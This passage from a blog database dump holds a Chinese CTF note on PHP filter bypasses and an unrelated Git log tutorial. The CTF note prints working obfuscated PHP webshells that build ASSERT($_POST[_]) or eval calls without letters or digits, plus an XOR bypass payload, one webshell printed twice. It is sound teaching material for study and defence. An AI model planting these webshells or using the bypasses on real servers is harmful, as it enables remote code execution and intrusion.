punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// P</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// O</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// T</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span>$<span class=\"token variable\">$____</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span>_<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// ASSERT($_POST[_]);</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>执行结果：</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg\" alt=\"14872701052595.jpg\"></p>\n<blockquote>\n<p>详见：</p>\n<p><a href=\"https://www.leavesongs.com/penetration/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/penetration/webshell-without-alphanum.html</a> </p>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n</blockquote>\n<h2 id=\"待续。。。\"><a href=\"#待续。。。\" class=\"headerlink\" title=\"待续。。。\"></a>待续。。。</h2>","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"CTF——Web安全中的一些绕过\"><a href=\"#CTF——Web安全中的一些绕过\" class=\"headerlink\" title=\"CTF——Web安全中的一些绕过\"></a>CTF——Web安全中的一些绕过</h1><ul>\n<li>Learning from <a href=\"https://www.cnblogs.com/leixiao-/\" target=\"_blank\" rel=\"noopener\">淚笑</a>、<a href=\"https://www.cnblogs.com/ECJTUACM-873284962/\" target=\"_blank\" rel=\"noopener\">Angel_Kitty</a>、<a href=\"https://www.leavesongs.com/\" target=\"_blank\" rel=\"noopener\">离别歌</a></li>\n</ul>\n<h2 id=\"利用数的十六进制\"><a href=\"#利用数的十六进制\" class=\"headerlink\" title=\"利用数的十六进制\"></a>利用数的十六进制</h2><pre><code class=\"php\">function check($number)\n{\n    $one = ord(&#39;1&#39;);\n    $nine = ord(&#39;9&#39;);\n    for ($i = 0; $i &lt; strlen($number); $i++)\n    {\n        $digit = ord($number{$i});\n        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )\n        {\n            return false;\n        }\n    }\n    return $number == &#39;11259375&#39;;\n}</code></pre>\n<p>用11259375的16进制形式0xabcdef</p>\n<h2 id=\"弱类型比较\"><a href=\"#弱类型比较\" class=\"headerlink\" title=\"弱类型比较\"></a>弱类型比较</h2><pre><code class=\"php\">$num=$_GET[&#39;num&#39;];\nif(!is_numeric($num))\n {\n     echo $num;\n     if($num==1)\n         echo &#39;flag{**********}&#39;;\n }</code></pre>\n<p>不能用16进制形式0x1或前面加0形式0001或者科学计数法形式0e0，因为都会被判断为数字。但可以提交1xxx,后面跟上除了数字，点（两个点可以：1..）以外任意字符即可，php用==比较字符串和数字时，会把字符串隐式转换为数字，如果字符串中有非数字字符，只取最前面的数字，例如”1x”=1,”22asd”=22,”qwe123”=0</p>\n<h2 id=\"正则匹配绕过\"><a href=\"#正则匹配绕过\" class=\"headerlink\" title=\"正则匹配绕过\"></a>正则匹配绕过</h2><h3 id=\"方法一：异或\"><a href=\"#方法一：异或\" class=\"headerlink\" title=\"方法一：异或\"></a>方法一：异或</h3><pre><code class=\"php\">&lt;?php\n\nfunction getFlag()\n{\n    echo &quot;flagxxxxxxx&quot;;\n}\n\nif(isset($_GET[&#39;code&#39;]))\n{\n    $code = $_GET[&#39;code&#39;];\n\n    if(strlen($code)&gt;40)\n    {\n        die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))\n    {\n        die(&quot;NO.&quot;);\n    }\n\n    @eval($code);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre>\n<blockquote>\n<p>?code=$_=”&lt;%)},?’”^”[@];@^@”;$_();  </p>\n</blockquote>\n<p>两句php代码，第一句 $_=” &lt;%)},?’ “ ^ “ [@];@^@ “; 是把两个字符串异或运算结果赋给$_变量，” &lt;%)},?’ “ 这个含7个字符的字符串和 “ [@];@^@ “ 异或的结果就是getFlag，然后第二句php代码 $_(); 就相当于getFlag();若是过滤了下划线，则 ${“ } “ ^ “ ; “} = “ &lt;%)},?’ “ ^ “ [@];@^@ “;  ${“ } “ ^ “ ; “}();</p>\n<h3 id=\"–方法二：取反\"><a href=\"#–方法二：取反\" class=\"headerlink\" title=\"–方法二：取反\"></a>–方法二：取反</h3><p>“如何编写一个不使用数字和字母的webshell”，具体为如下代码：</p>\n<pre><code class=\"php\">&lt;?php\nif(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) {\n  eval($_GET[&#39;shell&#39;]);\n}</code></pre>\n<p>利用UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>&quot;\\x8c&quot;</code>，其取反即为字母<code>s</code></p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg\" alt=\"14872686600768.jpg\"></p>\n<p>利用这个特性生成如下答案：</p>\n<pre><code class=\"php\">&lt;?php\n$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);\n$_=$__/$__;\n\n$____=&#39;&#39;;\n$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});\n\n$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});\n\n$_=$$_____;\n$____($_[$__]);</code></pre>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg\" alt=\"14871906748025.jpg\"></p>\n<p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p>\n<h3 id=\"–方法三：字符变量自增\"><a href=\"#–方法三：字符变量自增\" class=\"headerlink\" title=\"–方法三：字符变量自增\"></a>–方法三：字符变量自增</h3><p>题目源代码在方法二中</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201021010048673.png\" alt=\"image-20201021010048673\"></p>\n<p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… </p>\n<p>所以，只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>\n<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>\n<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，可以同时拿到小写和大写A，等于就可以拿到a-z和A-Z的所有字母。</p>\n<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>\n<p><img src=\"https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg\" alt=\"14872697183159.jpg\"></p>\n<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>\n<p>利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p>\n<pre><code class=\"php\">&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;\n$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&#39;_&#39;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;\n$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&#39;_&#39;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);</code></pre>\n<p>执行结果：</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg\" alt=\"14872701052595.jpg\"></p>\n<blockquote>\n<p>详见：</p>\n<p><a href=\"https://www.leavesongs.com/penetration/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/penetration/webshell-without-alphanum.html</a> </p>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n</blockquote>\n<h2 id=\"待续。。。\"><a href=\"#待续。。。\" class=\"headerlink\" title=\"待续。。。\"></a>待续。。。</h2>"},{"title":"Git学习","date":"2021-09-10T06:01:09.623Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# Git\n\n- Leaning from [Git book](https://git-scm.com/book/zh/v2)\n\n\n\n## 2. Git 基础\n\n\n\n### 2.3 Git 基础 - 查看提交历史\n\n- `git log` 命令\n\n  ![image-20201023013143508](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013143508.png)\n\n  - 该命令列出每个提交的 SHA-1 校验值、作者的名字和电子邮件地址、提交时间以及提交说明。\n\n  - 不传入任何参数的默认情况下，`git log` 会按时间先后顺序列出所有的提交，最近的更新排在最上面。\n\n  - 选项 `-p` 或 `--patch` 。它会显示每次提交所引入的差异（按 **补丁** 的格式输出），你也可以限制显示的日志条目数量，例如使用 `-2` 选项来只显示最近的两次提交。![image-20201023013249918](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013249918.png)\n\n  - 选项 `--stat` 。当进行代码审查，或者快速浏览某个搭档的提交所带来的变化的时候，这个参数就非常有用了。你也可以为 `git log` 附带一系列的总结性选项。 比如你想看到每次提交的简略统计信息：![image-20201023013424138](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013424138.png)正如你所看到的，`--stat` 选项在每次提交的下面列出所有被修改过的文件、有多少文件被修改了以及被修改过的文件的哪些行被移除或是添加了。 在每次提交的最后还有一个总结。\n\n  - 选项 `--pretty`。这个选项可以使用**不同于默认格式**的方式展示提交历史。 这个选项有一些内建的子选项供你使用。\n\n    -  比如 `oneline` 会将每个提交放在一行显示，在浏览大量的提交时非常有用。 另外还有 `short`，`full` 和 `fuller` 子选项，与`oneline`展示信息的格式基本一致，详尽程度不一。![image-20201023013831955](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013831955.png)\n\n    - 子选项 `format` ，可以定制记录的显示格式![image-20201023014446505](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023014446505.png)`format` 接受的常用格式占位符的写法及其代表的意义可参考官方文档[常用的选项](https://git-scm.com/book/zh/v2/ch00/pretty_format)\n\n  -  `--since` 和 `--until` 这种按照时间作限制的选项很有用。 例如，下面的命令会列出最近两周的所有提交：\n\n    ```shell\n    $ git log --since=2.weeks\n    ```\n\n    该命令可用的格式十分丰富——可以是类似 `\"2008-01-15\"` 的具体的某一天，也可以是类似 `\"2 years 1 day 3 minutes ago\"` 的相对日期。\n\n  -  `--author` 选项显示指定作者的提交.\n\n  -  `--grep` 选项搜索提交说明中的关键字。\n\n  - 另一个非常有用的过滤器是 `-S`（俗称“pickaxe”选项，取“用鹤嘴锄在土里捡石头”之意）， 它接受一个字符串参数，并且只会显示那些添加或删除了该字符串的提交。 假设你想找出添加或删除了对某一个特定函数的引用的提交，可以调用：\n\n    ```shell\n    $ git log -S function_name\n    ```\n\n\n\n## [git-stash用法小结](https://www.cnblogs.com/tocy/p/git-stash-reference.html)\n\n\n\n","source":"_posts/Git学习.md","raw":"---\ntitle: Git学习\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: Git\ncategories: Git\n---\n\n\n\n# Git\n\n- Leaning from [Git book](https://git-scm.com/book/zh/v2)\n\n\n\n## 2. Git 基础\n\n\n\n### 2.3 Git 基础 - 查看提交历史\n\n- `git log` 命令\n\n  ![image-20201023013143508](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013143508.png)\n\n  - 该命令列出每个提交的 SHA-1 校验值、作者的名字和电子邮件地址、提交时间以及提交说明。\n\n  - 不传入任何参数的默认情况下，`git log` 会按时间先后顺序列出所有的提交，最近的更新排在最上面。\n\n  - 选项 `-p` 或 `--patch` 。它会显示每次提交所引入的差异（按 **补丁** 的格式输出），你也可以限制显示的日志条目数量，例如使用 `-2` 选项来只显示最近的两次提交。![image-20201023013249918](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013249918.png)\n\n  - 选项 `--stat` 。当进行代码审查，或者快速浏览某个搭档的提交所带来的变化的时候，这个参数就非常有用了。你也可以为 `git log` 附带一系列的总结性选项。 比如你想看到每次提交的简略统计信息：![image-20201023013424138](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013424138.png)正如你所看到的，`--stat` 选项在每次提交的下面列出所有被修改过的文件、有多少文件被修改了以及被修改过的文件的哪些行被移除或是添加了。 在每次提交的最后还有一个总结。\n\n  - 选项 `--pretty`。这个选项可以使用**不同于默认格式**的方式展示提交历史。 这个选项有一些内建的子选项供你使用。\n\n    -  比如 `oneline` 会将每个提交放在一行显示，在浏览大量的提交时非常有用。 另外还有 `short`，`full` 和 `fuller` 子选项，与`oneline`展示信息的格式基本一致，详尽程度不一。![image-20201023013831955](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013831955.png)\n\n    - 子选项 `format` ，可以定制记录的显示格式![image-20201023014446505](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023014446505.png)`format` 接受的常用格式占位符的写法及其代表的意义可参考官方文档[常用的选项](https://git-scm.com/book/zh/v2/ch00/pretty_format)\n\n  -  `--since` 和 `--until` 这种按照时间作限制的选项很有用。 例如，下面的命令会列出最近两周的所有提交：\n\n    ```shell\n    $ git log --since=2.weeks\n    ```\n\n    该命令可用的格式十分丰富——可以是类似 `\"2008-01-15\"` 的具体的某一天，也可以是类似 `\"2 years 1 day 3 minutes ago\"` 的相对日期。\n\n  -  `--author` 选项显示指定作者的提交.\n\n  -  `--grep` 选项搜索提交说明中的关键字。\n\n  - 另一个非常有用的过滤器是 `-S`（俗称“pickaxe”选项，取“用鹤嘴锄在土里捡石头”之意）， 它接受一个字符串参数，并且只会显示那些添加或删除了该字符串的提交。 假设你想找出添加或删除了对某一个特定函数的引用的提交，可以调用：\n\n    ```shell\n    $ git log -S function_name\n    ```\n\n\n\n## [git-stash用法小结](https://www.cnblogs.com/tocy/p/git-stash-reference.html)\n\n\n\n","slug":"Git学习","published":1,"updated":"2021-07-27T03:38:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydl000gt8op6pv0a18x","content":"<h1 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h1><ul>\n<li>Leaning from <a href=\"https://git-scm.com/book/zh/v2\" target=\"_blank\" rel=\"noopener\">Git book</a></li>\n</ul>\n<h2 id=\"2-Git-基础\"><a href=\"#2-Git-基础\" class=\"headerlink\" title=\"2. Git 基础\"></a>2. Git 基础</h2><h3 id=\"2-3-Git-基础-查看提交历史\"><a href=\"#2-3-Git-基础-查看提交历史\" class=\"headerlink\" title=\"2.3 Git 基础 - 查看提交历史\"></a>2.3 Git 基础 - 查看提交历史</h3><ul>\n<li><p><code>git log</code> 命令</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013143508.png\" alt=\"image-20201023013143508\"></p>\n<ul>\n<li><p>该命令列出每个提交的 SHA-1 校验值、作者的名字和电子邮件地址、提交时间以及提交说明。</p>\n</li>\n<li><p>不传入任何参数的默认情况下，<code>git log</code> 会按时间先后顺序列出所有的提交，最近的更新排在最上面。</p>\n</li>\n<li><p>选项 <code>-p</code> 或 <code>--patch</code> 。它会显示每次提交所引入的差异（按 <strong>补丁</strong> 的格式输出），你也可以限制显示的日志条目数量，例如使用 <code>-2</code> 选项来只显示最近的两次提交。<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013249918.png\" alt=\"image-20201023013249918\"></p>\n</li>\n<li><p>选项 <code>--stat</code> 。当进行代码审查，或者快速浏览某个搭档的提交所带来的变化的时候，这个参数就非常有用了。你也可以为 <code>git log</code> 附带一系列的总结性选项。 比如你想看到每次提交的简略统计信息：<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013424138.png\" alt=\"image-20201023013424138\">正如你所看到的，<code>--stat</code> 选项在每次提交的下面列出所有被修改过的文件、有多少文件被修改了以及被修改过的文件的哪些行被移除或是添加了。 在每次提交的最后还有一个总结。</p>\n</li>\n<li><p>选项 <code>--pretty</code>。这个选项可以使用<strong>不同于默认格式</strong>的方式展示提交历史。 这个选项有一些内建的子选项供你使用。</p>\n<ul>\n<li><p>比如 <code>oneline</code> 会将每个提交放在一行显示，在浏览大量的提交时非常有用。 另外还有 <code>short</code>，<code>full</code> 和 <code>fuller</code> 子选项，与<code>oneline</code>展示信息的格式基本一致，详尽程度不一。<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013831955.png\" alt=\"image-20201023013831955\"></p>\n</li>\n<li><p>子选项 <code>format</code> ，可以定制记录的显示格式<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023014446505.png\" alt=\"image-20201023014446505\"><code>format</code> 接受的常用格式占位符的写法及其代表的意义可参考官方文档<a href=\"https://git-scm.com/book/zh/v2/ch00/pretty_format\" target=\"_blank\" rel=\"noopener\">常用的选项</a></p>\n</li>\n</ul>\n</li>\n<li><p><code>--since</code> 和 <code>--until</code> 这种按照时间作限制的选项很有用。 例如，下面的命令会列出最近两周的所有提交：</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">$ git log --since=2.weeks<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>该命令可用的格式十分丰富——可以是类似 <code>\"2008-01-15\"</code> 的具体的某一天，也可以是类似 <code>\"2 years 1 day 3 minutes ago\"</code> 的相对日期。</p>\n</li>\n<li><p><code>--author</code> 选项显示指定作者的提交.</p>\n</li>\n<li><p><code>--grep</code> 选项搜索提交说明中的关键字。</p>\n</li>\n<li><p>另一个非常有用的过滤器是 